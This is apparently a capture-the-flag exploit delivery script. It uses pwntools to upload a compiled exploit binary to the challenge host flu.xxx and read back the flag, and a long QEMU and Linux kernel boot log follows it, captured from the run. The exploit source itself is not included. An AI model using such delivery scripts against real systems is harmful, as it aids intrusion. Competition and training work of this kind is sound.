import pwn
import os
import sys

assert len(sys.argv) == 2

size = os.path.getsize(sys.argv[1])
f = open(sys.argv[1], "rb")

p = pwn.remote("flu.xxx", 20065)
p.sendlineafter(b"Enter file size:", str(size).encode())

p.sendlineafter(b"Now send the file\n", f.read())

r = b""
line = b""

while not b"flag{" in line:
    line = p.recvline()
    print(line)
    r += line

print("flag: " + r[r.find(b"flag"):r.find(b"}")+1].decode())
# musl-gcc remote.c -static -o remote
'''
$ python3 send_xpl.py remote
[x] Opening connection to flu.xxx on port 20065
[x] Opening connection to flu.xxx on port 20065: Trying 31.22.123.45
[+] Opening connection to flu.xxx on port 20065: Done
b'48320+0 records in\n'
b'48320+0 records out\n'
b'48320 bytes (48 kB, 47 KiB) copied, 0.683951 s, 70.6 kB/s\n'
b'\x1bc\x1b[?7l\x1b[2J\x1b[0mSeaBIOS (version 1.13.0-1ubuntu1.1)\r\r\n'
b'Booting from ROM..\x1bc\x1b[?7l\x1b[2J[    0.000000] Linux version 5.11.0-38-generic (buildd@lgw01-amd64-041) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #42~20.04.1-Ubuntu SMP Tue Sep 28 20:41:07 UTC 2021 (Ubuntu 5.11.0-38.42~20.04.1-generic 5.11.22)\r\r\n'
b'[    0.000000] Command line: console=ttyS0\r\r\n'
b'[    0.000000] KERNEL supported cpus:\r\r\n'
b'[    0.000000]   Intel GenuineIntel\r\r\n'
b'[    0.000000]   AMD AuthenticAMD\r\r\n'
b'[    0.000000]   Hygon HygonGenuine\r\r\n'
b'[    0.000000]   Centaur CentaurHauls\r\r\n'
b'[    0.000000]   zhaoxin   Shanghai  \r\r\n'
b'[    0.000000] x86/fpu: x87 FPU will use FXSAVE\r\r\n'
b'[    0.000000] BIOS-provided physical RAM map:\r\r\n'
b'[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable\r\r\n'
b'[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved\r\r\n'
b'[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved\r\r\n'
b'[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x0000000007fdffff] usable\r\r\n'
b'[    0.000000] BIOS-e820: [mem 0x0000000007fe0000-0x0000000007ffffff] reserved\r\r\n'
b'[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved\r\r\n'
b'[    0.000000] NX (Execute Disable) protection: active\r\r\n'
b'[    0.000000] SMBIOS 2.8 present.\r\r\n'
b'[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014\r\r\n'
b'[    0.000000] tsc: Fast TSC calibration using PIT\r\r\n'
b'[    0.000000] tsc: Detected 2394.462 MHz processor\r\r\n'
b'[    0.006425] last_pfn = 0x7fe0 max_arch_pfn = 0x400000000\r\r\n'
b'[    0.008762] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  \r\r\n'
b'[    0.030608] found SMP MP-table at [mem 0x000f5ca0-0x000f5caf]\r\r\n'
b'[    0.033435] check: Scanning 1 areas for low memory corruption\r\r\n'
b'[    0.039779] RAMDISK: [mem 0x07f38000-0x07fdffff]\r\r\n'
b'[    0.040444] ACPI: Early table checksum verification disabled\r\r\n'
b'[    0.041270] ACPI: RSDP 0x00000000000F5AE0 000014 (v00 BOCHS )\r\r\n'
b'[    0.041719] ACPI: RSDT 0x0000000007FE14F5 000034 (v01 BOCHS  BXPCRSDT 00000001 BXPC 00000001)\r\r\n'
b'[    0.042835] ACPI: FACP 0x0000000007FE13A9 000074 (v01 BOCHS  BXPCFACP 00000001 BXPC 00000001)\r\r\n'
b'[    0.043830] ACPI: DSDT 0x0000000007FE0040 001369 (v01 BOCHS  BXPCDSDT 00000001 BXPC 00000001)\r\r\n'
b'[    0.044065] ACPI: FACS 0x0000000007FE0000 000040\r\r\n'
b'[    0.044222] ACPI: APIC 0x0000000007FE141D 000078 (v01 BOCHS  BXPCAPIC 00000001 BXPC 00000001)\r\r\n'
b'[    0.044318] ACPI: HPET 0x0000000007FE1495 000038 (v01 BOCHS  BXPCHPET 00000001 BXPC 00000001)\r\r\n'
b'[    0.044405] ACPI: WAET 0x0000000007FE14CD 000028 (v01 BOCHS  BXPCWAET 00000001 BXPC 00000001)\r\r\n'
b'[    0.044653] ACPI: Reserving FACP table memory at [mem 0x7fe13a9-0x7fe141c]\r\r\n'
b'[    0.044722] ACPI: Reserving DSDT table memory at [mem 0x7fe0040-0x7fe13a8]\r\r\n'
b'[    0.044754] ACPI: Reserving FACS table memory at [mem 0x7fe0000-0x7fe003f]\r\r\n'
b'[    0.044777] ACPI: Reserving APIC table memory at [mem 0x7fe141d-0x7fe1494]\r\r\n'
b'[    0.044796] ACPI: Reserving HPET table memory at [mem 0x7fe1495-0x7fe14cc]\r\r\n'
b'[    0.044814] ACPI: Reserving WAET table memory at [mem 0x7fe14cd-0x7fe14f4]\r\r\n'
b'[    0.050068] No NUMA configuration found\r\r\n'
b'[    0.050145] Faking a node at [mem 0x0000000000000000-0x0000000007fdffff]\r\r\n'
b'[    0.051346] NODE_DATA(0) allocated [mem 0x07f0e000-0x07f37fff]\r\r\n'
b'[    0.057066] Zone ranges:\r\r\n'
b'[    0.057132]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]\r\r\n'
b'[    0.057277]   DMA32    [mem 0x0000000001000000-0x0000000007fdffff]\r\r\n'
b'[    0.057321]   Normal   empty\r\r\n'
b'[    0.057367]   Device   empty\r\r\n'
b'[    0.057406] Movable zone start for each node\r\r\n'
b'[    0.057483] Early memory node ranges\r\r\n'
b'[    0.057540]   node   0: [mem 0x0000000000001000-0x000000000009efff]\r\r\n'
b'[    0.057800]   node   0: [mem 0x0000000000100000-0x0000000007fdffff]\r\r\n'
b'[    0.058136] Initmem setup node 0 [mem 0x0000000000001000-0x0000000007fdffff]\r\r\n'
b'[    0.060570] On node 0, zone DMA: 1 pages in unavailable ranges\r\r\n'
b'[    0.060916] On node 0, zone DMA: 97 pages in unavailable ranges\r\r\n'
b'[    0.061924] On node 0, zone DMA32: 32 pages in unavailable ranges\r\r\n'
b'[    0.062606] ACPI: PM-Timer IO Port: 0x608\r\r\n'
b'[    0.063430] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])\r\r\n'
b'[    0.064072] IOAPIC[0]: apic_id 0, version 32, address 0xfec00000, GSI 0-23\r\r\n'
b'[    0.064314] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)\r\r\n'
b'[    0.064754] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)\r\r\n'
b'[    0.064830] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)\r\r\n'
b'[    0.065004] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)\r\r\n'
b'[    0.065061] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)\r\r\n'
b'[    0.065468] Using ACPI (MADT) for SMP configuration information\r\r\n'
b'[    0.065574] ACPI: HPET id: 0x8086a201 base: 0xfed00000\r\r\n'
b'[    0.066182] smpboot: Allowing 1 CPUs, 0 hotplug CPUs\r\r\n'
b'[    0.067586] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]\r\r\n'
b'[    0.067701] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]\r\r\n'
b'[    0.067759] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]\r\r\n'
b'[    0.067786] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]\r\r\n'
b'[    0.067965] [mem 0x08000000-0xfffbffff] available for PCI devices\r\r\n'
b'[    0.068076] Booting paravirtualized kernel on bare hardware\r\r\n'
b'[    0.068571] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645519600211568 ns\r\r\n'
b'[    0.069446] setup_percpu: NR_CPUS:8192 nr_cpumask_bits:1 nr_cpu_ids:1 nr_node_ids:1\r\r\n'
b'[    0.079020] percpu: Embedded 56 pages/cpu s192512 r8192 d28672 u2097152\r\r\n'
b'[    0.082152] Built 1 zonelists, mobility grouping on.  Total pages: 32105\r\r\n'
b'[    0.082221] Policy zone: DMA32\r\r\n'
b'[    0.082519] Kernel command line: console=ttyS0\r\r\n'
b'[    0.084413] Dentry cache hash table entries: 16384 (order: 5, 131072 bytes, linear)\r\r\n'
b'[    0.084833] Inode-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)\r\r\n'
b'[    0.087420] mem auto-init: stack:off, heap alloc:on, heap free:off\r\r\n'
b'[    0.094930] Memory: 91984K/130552K available (14345K kernel code, 3478K rwdata, 5460K rodata, 2688K init, 5976K bss, 38308K reserved, 0K cma-reserved)\r\r\n'
b'[    0.095533] random: get_random_u64 called from __kmem_cache_create+0x2d/0x430 with crng_init=0\r\r\n'
b'[    0.104468] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1\r\r\n'
b'[    0.106530] ftrace: allocating 48695 entries in 191 pages\r\r\n'
b'[    0.223542] ftrace: allocated 191 pages with 7 groups\r\r\n'
b'[    0.237119] rcu: Hierarchical RCU implementation.\r\r\n'
b'[    0.237187] rcu: \tRCU restricting CPUs from NR_CPUS=8192 to nr_cpu_ids=1.\r\r\n'
b'[    0.237339] \tRude variant of Tasks RCU enabled.\r\r\n'
b'[    0.237371] \tTracing variant of Tasks RCU enabled.\r\r\n'
b'[    0.237516] rcu: RCU calculated value of scheduler-enlistment delay is 25 jiffies.\r\r\n'
b'[    0.237578] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=1\r\r\n'
b'[    0.271014] NR_IRQS: 524544, nr_irqs: 256, preallocated irqs: 16\r\r\n'
b'[    0.289898] Console: colour *CGA 80x25\r\r\n'
b'[    0.390583] printk: console [ttyS0] enabled\r\r\n'
b'[    0.392707] ACPI: Core revision 20201113\r\r\n'
b'[    0.403153] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns\r\r\n'
b'[    0.410006] APIC: Switch to symmetric I/O mode setup\r\r\n'
b'[    0.417364] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1\r\r\n'
b'[    0.438277] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2283c7bd99f, max_idle_ns: 440795233967 ns\r\r\n'
b'[    0.439967] Calibrating delay loop (skipped), value calculated using timer frequency.. 4788.92 BogoMIPS (lpj=9577848)\r\r\n'
b'[    0.441001] pid_max: default: 32768 minimum: 301\r\r\n'
b'[    0.444427] LSM: Security Framework initializing\r\r\n'
b'[    0.445962] Yama: becoming mindful.\r\r\n'
b'[    0.449589] AppArmor: AppArmor initialized\r\r\n'
b'[    0.452421] Mount-cache hash table entries: 512 (order: 0, 4096 bytes, linear)\r\r\n'
b'[    0.452876] Mountpoint-cache hash table entries: 512 (order: 0, 4096 bytes, linear)\r\r\n'
b'[    0.483353] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0\r\r\n'
b'[    0.483681] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0\r\r\n'
b'[    0.484440] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization\r\r\n'
b'[    0.485115] Spectre V2 : Mitigation: Full AMD retpoline\r\r\n'
b'[    0.485387] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch\r\r\n'
b'[    0.485949] Speculative Store Bypass: Vulnerable\r\r\n'
b'[    0.828883] Freeing SMP alternatives memory: 40K\r\r\n'
b'[    0.983385] smpboot: CPU0: AMD QEMU Virtual CPU version 2.5+ (family: 0x6, model: 0x6, stepping: 0x3)\r\r\n'
b'[    0.993237] Performance Events: PMU not available due to virtualization, using software events only.\r\r\n'
b'[    0.996665] rcu: Hierarchical SRCU implementation.\r\r\n'
b'[    1.011110] NMI watchdog: Perf NMI watchdog permanently disabled\r\r\n'
b'[    1.017471] smp: Bringing up secondary CPUs ...\r\r\n'
b'[    1.017915] smp: Brought up 1 node, 1 CPU\r\r\n'
b'[    1.018213] smpboot: Max logical packages: 1\r\r\n'
b'[    1.018618] smpboot: Total of 1 processors activated (4788.92 BogoMIPS)\r\r\n'
b'[    1.037368] devtmpfs: initialized\r\r\n'
b'[    1.044068] x86/mm: Memory block size: 128MB\r\r\n'
b'[    1.053815] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns\r\r\n'
b'[    1.055057] futex hash table entries: 256 (order: 2, 16384 bytes, linear)\r\r\n'
b'[    1.060590] pinctrl core: initialized pinctrl subsystem\r\r\n'
b'[    1.072365] PM: RTC time: 20:47:09, date: 2021-11-01\r\r\n'
b'[    1.083683] NET: Registered protocol family 16\r\r\n'
b'[    1.089404] DMA: preallocated 128 KiB GFP_KERNEL pool for atomic allocations\r\r\n'
b'[    1.090419] DMA: preallocated 128 KiB GFP_KERNEL|GFP_DMA pool for atomic allocations\r\r\n'
b'[    1.091226] DMA: preallocated 128 KiB GFP_KERNEL|GFP_DMA32 pool for atomic allocations\r\r\n'
b'[    1.091972] audit: initializing netlink subsys (disabled)\r\r\n'
b'[    1.099979] audit: type=2000 audit(1635799628.684:1): state=initialized audit_enabled=0 res=1\r\r\n'
b"[    1.104821] thermal_sys: Registered thermal governor 'fair_share'\r\r\n"
b"[    1.104886] thermal_sys: Registered thermal governor 'bang_bang'\r\r\n"
b"[    1.105435] thermal_sys: Registered thermal governor 'step_wise'\r\r\n"
b"[    1.105745] thermal_sys: Registered thermal governor 'user_space'\r\r\n"
b"[    1.106281] thermal_sys: Registered thermal governor 'power_allocator'\r\r\n"
b'[    1.107566] EISA bus registered\r\r\n'
b'[    1.108426] cpuidle: using governor ladder\r\r\n'
b'[    1.108794] cpuidle: using governor menu\r\r\n'
b'[    1.110560] ACPI: bus type PCI registered\r\r\n'
b'[    1.111790] acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5\r\r\n'
b'[    1.116389] PCI: Using configuration type 1 for base access\r\r\n'
b'[    1.146971] Kprobes globally optimized\r\r\n'
b'[    1.152814] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages\r\r\n'
b'[    1.198249] ACPI: Added _OSI(Module Device)\r\r\n'
b'[    1.198864] ACPI: Added _OSI(Processor Device)\r\r\n'
b'[    1.199285] ACPI: Added _OSI(3.0 _SCP Extensions)\r\r\n'
b'[    1.199669] ACPI: Added _OSI(Processor Aggregator Device)\r\r\n'
b'[    1.200367] ACPI: Added _OSI(Linux-Dell-Video)\r\r\n'
b'[    1.200644] ACPI: Added _OSI(Linux-Lenovo-NV-HDMI-Audio)\r\r\n'
b'[    1.201041] ACPI: Added _OSI(Linux-HPI-Hybrid-Graphics)\r\r\n'
b'[    1.243623] ACPI: 1 ACPI AML tables successfully acquired and loaded\r\r\n'
b'[    1.271371] ACPI: Interpreter enabled\r\r\n'
b'[    1.273204] ACPI: (supports S0 S3 S4 S5)\r\r\n'
b'[    1.273576] ACPI: Using IOAPIC for interrupt routing\r\r\n'
b'[    1.274638] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug\r\r\n'
b'[    1.278544] ACPI: Enabled 2 GPEs in block 00 to 0F\r\r\n'
b'[    1.347021] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])\r\r\n'
b'[    1.348275] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]\r\r\n'
b"[    1.349986] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.\r\r\n"
b'[    1.362144] acpiphp: Slot [2] registered\r\r\n'
b'[    1.362690] acpiphp: Slot [3] registered\r\r\n'
b'[    1.363158] acpiphp: Slot [4] registered\r\r\n'
b'[    1.363698] acpiphp: Slot [5] registered\r\r\n'
b'[    1.364104] acpiphp: Slot [6] registered\r\r\n'
b'[    1.364518] acpiphp: Slot [7] registered\r\r\n'
b'[    1.364943] acpiphp: Slot [8] registered\r\r\n'
b'[    1.365361] acpiphp: Slot [9] registered\r\r\n'
b'[    1.365813] acpiphp: Slot [10] registered\r\r\n'
b'[    1.366220] acpiphp: Slot [11] registered\r\r\n'
b'[    1.366636] acpiphp: Slot [12] registered\r\r\n'
b'[    1.367027] acpiphp: Slot [13] registered\r\r\n'
b'[    1.367436] acpiphp: Slot [14] registered\r\r\n'
b'[    1.367862] acpiphp: Slot [15] registered\r\r\n'
b'[    1.368353] acpiphp: Slot [16] registered\r\r\n'
b'[    1.368814] acpiphp: Slot [17] registered\r\r\n'
b'[    1.369333] acpiphp: Slot [18] registered\r\r\n'
b'[    1.369791] acpiphp: Slot [19] registered\r\r\n'
b'[    1.370291] acpiphp: Slot [20] registered\r\r\n'
b'[    1.370824] acpiphp: Slot [21] registered\r\r\n'
b'[    1.371256] acpiphp: Slot [22] registered\r\r\n'
b'[    1.371829] acpiphp: Slot [23] registered\r\r\n'
b'[    1.372255] acpiphp: Slot [24] registered\r\r\n'
b'[    1.372667] acpiphp: Slot [25] registered\r\r\n'
b'[    1.373094] acpiphp: Slot [26] registered\r\r\n'
b'[    1.373527] acpiphp: Slot [27] registered\r\r\n'
b'[    1.373955] acpiphp: Slot [28] registered\r\r\n'
b'[    1.374358] acpiphp: Slot [29] registered\r\r\n'
b'[    1.374782] acpiphp: Slot [30] registered\r\r\n'
b'[    1.375205] acpiphp: Slot [31] registered\r\r\n'
b'[    1.376125] PCI host bridge to bus 0000:00\r\r\n'
b'[    1.377117] pci_bus 0000:00: root bus resource [bus 00-ff]\r\r\n'
b'[    1.377544] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]\r\r\n'
b'[    1.378004] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]\r\r\n'
b'[    1.378791] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]\r\r\n'
b'[    1.379582] pci_bus 0000:00: root bus resource [mem 0x08000000-0xfebfffff window]\r\r\n'
b'[    1.380225] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]\r\r\n'
b'[    1.382664] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000\r\r\n'
b'[    1.391782] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100\r\r\n'
b'[    1.394828] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180\r\r\n'
b'[    1.395954] pci 0000:00:01.1: reg 0x20: [io  0xc000-0xc00f]\r\r\n'
b'[    1.400580] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]\r\r\n'
b'[    1.401322] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]\r\r\n'
b'[    1.402183] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]\r\r\n'
b'[    1.402552] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]\r\r\n'
b'[    1.405212] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000\r\r\n'
b'[    1.406332] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI\r\r\n'
b'[    1.407012] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB\r\r\n'
b'[    1.412909] pci 0000:00:02.0: [1337:1337] type 00 class 0x00ff00\r\r\n'
b'[    1.414547] pci 0000:00:02.0: reg 0x10: [mem 0xfeb00000-0xfebfffff]\r\r\n'
b'[    1.431015] ACPI: PCI Interrupt Link [LNKA] (IRQs 5 *10 11)\r\r\n'
b'[    1.433532] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)\r\r\n'
b'[    1.435977] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)\r\r\n'
b'[    1.437895] ACPI: PCI Interrupt Link [LNKD] (IRQs 5 10 *11)\r\r\n'
b'[    1.438931] ACPI: PCI Interrupt Link [LNKS] (IRQs *9)\r\r\n'
b'[    1.444490] iommu: Default domain type: Translated \r\r\n'
b'[    1.450490] SCSI subsystem initialized\r\r\n'
b'[    1.456383] vgaarb: loaded\r\r\n'
b'[    1.457631] ACPI: bus type USB registered\r\r\n'
b'[    1.458436] usbcore: registered new interface driver usbfs\r\r\n'
b'[    1.459207] usbcore: registered new interface driver hub\r\r\n'
b'[    1.459752] usbcore: registered new device driver usb\r\r\n'
b'[    1.460897] pps_core: LinuxPPS API ver. 1 registered\r\r\n'
b'[    1.461071] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>\r\r\n'
b'[    1.461609] PTP clock support registered\r\r\n'
b'[    1.463092] EDAC MC: Ver: 3.0.0\r\r\n'
b'[    1.478375] NetLabel: Initializing\r\r\n'
b'[    1.478615] NetLabel:  domain hash size = 128\r\r\n'
b'[    1.478938] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO\r\r\n'
b'[    1.480700] NetLabel:  unlabeled traffic allowed by default\r\r\n'
b'[    1.482076] PCI: Using ACPI for IRQ routing\r\r\n'
b'[    1.485621] hpet: 3 channels of 0 reserved for per-cpu timers\r\r\n'
b'[    1.486354] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0\r\r\n'
b'[    1.486657] hpet0: 3 comparators, 64-bit 100.000000 MHz counter\r\r\n'
b'[    1.492523] clocksource: Switched to clocksource tsc-early\r\r\n'
b'[    1.621590] VFS: Disk quotas dquot_6.6.0\r\r\n'
b'[    1.622082] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)\r\r\n'
b'[    1.667983] AppArmor: AppArmor Filesystem Enabled\r\r\n'
b'[    1.669621] pnp: PnP ACPI init\r\r\n'
b'[    1.681562] pnp: PnP ACPI: found 5 devices\r\r\n'
b'[    1.722979] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns\r\r\n'
b'[    1.725689] NET: Registered protocol family 2\r\r\n'
b'[    1.727968] IP idents hash table entries: 2048 (order: 2, 16384 bytes, linear)\r\r\n'
b'[    1.743511] tcp_listen_portaddr_hash hash table entries: 256 (order: 0, 4096 bytes, linear)\r\r\n'
b'[    1.748547] TCP established hash table entries: 1024 (order: 1, 8192 bytes, linear)\r\r\n'
b'[    1.749259] TCP bind hash table entries: 1024 (order: 2, 16384 bytes, linear)\r\r\n'
b'[    1.749766] TCP: Hash tables configured (established 1024 bind 1024)\r\r\n'
b'[    1.756780] MPTCP token hash table entries: 256 (order: 0, 6144 bytes, linear)\r\r\n'
b'[    1.757816] UDP hash table entries: 256 (order: 1, 8192 bytes, linear)\r\r\n'
b'[    1.758676] UDP-Lite hash table entries: 256 (order: 1, 8192 bytes, linear)\r\r\n'
b'[    1.762343] NET: Registered protocol family 1\r\r\n'
b'[    1.763077] NET: Registered protocol family 44\r\r\n'
b'[    1.765142] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]\r\r\n'
b'[    1.765456] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]\r\r\n'
b'[    1.765782] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]\r\r\n'
b'[    1.766113] pci_bus 0000:00: resource 7 [mem 0x08000000-0xfebfffff window]\r\r\n'
b'[    1.766410] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]\r\r\n'
b'[    1.767674] pci 0000:00:01.0: PIIX3: Enabling Passive Release\r\r\n'
b'[    1.768412] pci 0000:00:00.0: Limiting direct PCI/PCI transfers\r\r\n'
b'[    1.768900] pci 0000:00:01.0: Activating ISA DMA hang workarounds\r\r\n'
b'[    1.769379] PCI: CLS 0 bytes, default 64\r\r\n'
b'[    1.776193] Trying to unpack rootfs image as initramfs...\r\r\n'
b'[    1.843466] Freeing initrd memory: 672K\r\r\n'
b'[    1.847400] check: Scanning for low memory corruption every 60 seconds\r\r\n'
b'[    1.856315] Initialise system trusted keyrings\r\r\n'
b'[    1.861267] Key type blacklist registered\r\r\n'
b'[    1.863040] workingset: timestamp_bits=36 max_order=15 bucket_order=0\r\r\n'
b'[    1.884051] zbud: loaded\r\r\n'
b'[    1.891618] squashfs: version 4.0 (2009/01/31) Phillip Lougher\r\r\n'
b'[    1.896112] fuse: init (API version 7.33)\r\r\n'
b'[    1.903608] integrity: Platform Keyring initialized\r\r\n'
b'[    1.940411] Key type asymmetric registered\r\r\n'
b"[    1.940842] Asymmetric key parser 'x509' registered\r\r\n"
b'[    1.941547] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 243)\r\r\n'
b'[    1.943690] io scheduler mq-deadline registered\r\r\n'
b'[    1.949527] shpchp: Standard Hot Plug PCI Controller Driver version: 0.4\r\r\n'
b'[    1.958000] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0\r\r\n'
b'[    1.963985] ACPI: Power Button [PWRF]\r\r\n'
b'[    1.970493] Serial: 8250/16550 driver, 32 ports, IRQ sharing enabled\r\r\n'
b'[    1.998072] 00:03: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A\r\r\n'
b'[    2.033535] Linux agpgart interface v0.103\r\r\n'
b'[    2.160253] loop: module loaded\r\r\n'
b'[    2.182517] scsi host0: ata_piix\r\r\n'
b'[    2.187013] scsi host1: ata_piix\r\r\n'
b'[    2.188202] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc000 irq 14\r\r\n'
b'[    2.188569] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc008 irq 15\r\r\n'
b'[    2.199630] libphy: Fixed MDIO Bus: probed\r\r\n'
b'[    2.200410] tun: Universal TUN/TAP device driver, 1.6\r\r\n'
b'[    2.202426] PPP generic driver version 2.4.2\r\r\n'
b'[    2.204230] VFIO - User Level meta-driver version: 0.3\r\r\n'
b"[    2.206322] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver\r\r\n"
b'[    2.206856] ehci-pci: EHCI PCI platform driver\r\r\n'
b'[    2.207387] ehci-platform: EHCI generic platform driver\r\r\n'
b"[    2.208132] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver\r\r\n"
b'[    2.208608] ohci-pci: OHCI PCI platform driver\r\r\n'
b'[    2.209138] ohci-platform: OHCI generic platform driver\r\r\n'
b'[    2.209568] uhci_hcd: USB Universal Host Controller Interface driver\r\r\n'
b'[    2.212153] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12\r\r\n'
b'[    2.218137] serio: i8042 KBD port at 0x60,0x64 irq 1\r\r\n'
b'[    2.218711] serio: i8042 AUX port at 0x60,0x64 irq 12\r\r\n'
b'[    2.221965] mousedev: PS/2 mouse device common for all mice\r\r\n'
b'[    2.227720] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1\r\r\n'
b'[    2.229691] rtc_cmos 00:04: RTC can wake from S4\r\r\n'
b'[    2.238768] rtc_cmos 00:04: registered as rtc0\r\r\n'
b'[    2.239592] rtc_cmos 00:04: setting system clock to 2021-11-01T20:47:10 UTC (1635799630)\r\r\n'
b'[    2.241551] rtc_cmos 00:04: alarms up to one day, y3k, 242 bytes nvram, hpet irqs\r\r\n'
b'[    2.242095] i2c /dev entries driver\r\r\n'
b'[    2.245412] device-mapper: uevent: version 1.0.3\r\r\n'
b'[    2.247245] device-mapper: ioctl: 4.43.0-ioctl (2020-10-01) initialised: dm-devel@redhat.com\r\r\n'
b'[    2.248972] platform eisa.0: Probing EISA bus 0\r\r\n'
b'[    2.249289] platform eisa.0: EISA: Cannot allocate resource for mainboard\r\r\n'
b'[    2.249876] platform eisa.0: Cannot allocate resource for EISA slot 1\r\r\n'
b'[    2.250368] platform eisa.0: Cannot allocate resource for EISA slot 2\r\r\n'
b'[    2.250694] platform eisa.0: Cannot allocate resource for EISA slot 3\r\r\n'
b'[    2.250983] platform eisa.0: Cannot allocate resource for EISA slot 4\r\r\n'
b'[    2.251366] platform eisa.0: Cannot allocate resource for EISA slot 5\r\r\n'
b'[    2.251863] platform eisa.0: Cannot allocate resource for EISA slot 6\r\r\n'
b'[    2.252189] platform eisa.0: Cannot allocate resource for EISA slot 7\r\r\n'
b'[    2.252543] platform eisa.0: Cannot allocate resource for EISA slot 8\r\r\n'
b'[    2.252856] platform eisa.0: EISA: Detected 0 cards\r\r\n'
b'[    2.253873] ledtrig-cpu: registered to indicate activity on CPUs\r\r\n'
b'[    2.256053] drop_monitor: Initializing network drop monitor service\r\r\n'
b'[    2.259903] NET: Registered protocol family 10\r\r\n'
b'[    2.302168] Segment Routing with IPv6\r\r\n'
b'[    2.303114] NET: Registered protocol family 17\r\r\n'
b'[    2.304671] Key type dns_resolver registered\r\r\n'
b'[    2.308877] IPI shorthand broadcast: enabled\r\r\n'
b'[    2.309633] sched_clock: Marking stable (2180784824, 126976152)->(2310350173, -2589197)\r\r\n'
b'[    2.313307] registered taskstats version 1\r\r\n'
b'[    2.314079] Loading compiled-in X.509 certificates\r\r\n'
b"[    2.335452] Loaded X.509 cert 'Build time autogenerated kernel key: b7b636bb11118bc6a693b11ec4fb10c5f3fb970e'\r\r\n"
b"[    2.341295] Loaded X.509 cert 'Canonical Ltd. Live Patch Signing: 14df34d1a87cf37625abec039ef2bf521249b969'\r\r\n"
b"[    2.346125] Loaded X.509 cert 'Canonical Ltd. Kernel Module Signing: 88f752e560a1e0737e31163a466ad7b70a850c19'\r\r\n"
